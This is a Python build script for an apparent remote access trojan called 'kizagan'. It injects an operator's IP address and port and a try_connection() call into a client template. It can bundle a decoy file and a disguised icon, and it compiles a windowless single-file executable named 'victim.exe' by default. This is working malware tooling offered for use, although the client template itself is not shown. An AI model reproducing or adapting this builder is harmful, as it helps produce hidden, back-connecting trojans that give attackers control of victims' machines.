import os
import PyInstaller.__main__
from shutil import copyfile, rmtree

def build(ip, port, icon_file=None, merge_file=None, name=None):
    # Construct the code snippet based on merge_file
    if merge_file:
        code = f"""
open_merge_file('{merge_file}')
ip = '{ip}'
port = {port}
try_connection()
"""
    else:
        code = f"""
ip = '{ip}'
port = {port}
try_connection()
"""

    # Determine the correct path separator and build file path
    build_file_path = os.path.join("module", "kizagan_client_build.py")

    # Read the content of the build file
    with open(build_file_path, "r") as build_file:
        build_file_content = build_file.read()

    # Combine the build file content with the new code
    combined_code = build_file_content + code

    # Write the combined code to a new file
    building_file_path = "kizagan_client_building.py"
    with open(building_file_path, "w") as building_file:
        building_file.write(combined_code)

    # Prepare the PyInstaller command
    pyinstaller_args = [
        building_file_path,
        "--onefile",
        "--noconsole"
    ]
    
    if icon_file:
        pyinstaller_args.extend(["--icon", icon_file])
    
    if merge_file:
        pyinstaller_args.extend(["--add-data", f"{merge_file};."])

    # Run PyInstaller
    PyInstaller.__main__.run(pyinstaller_args)

    # Set the output name
    if not name:
        name = "victim.exe" if os.name == "nt" else "victim"
    elif len(name.split(".")) == 1:
        name = name + (".exe" if os.name == "nt" else "")

    # Copy the output file to the desired location
    dist_file = "kizagan_client_building.exe" if os.name == "nt" else "kizagan_client_building"
    output_file = os.path.join("output", name)
    copyfile(os.path.join("dist", dist_file), output_file)

    # Clean up
    os.remove(building_file_path)
    try:
        os.remove("kizagan_client_building.spec")
    except FileNotFoundError:
        pass
    rmtree("dist", ignore_errors=True)
    rmtree("build", ignore_errors=True)

    # Print completion message
    print(f"[+] Build completed. Executable file located: {output_file}")

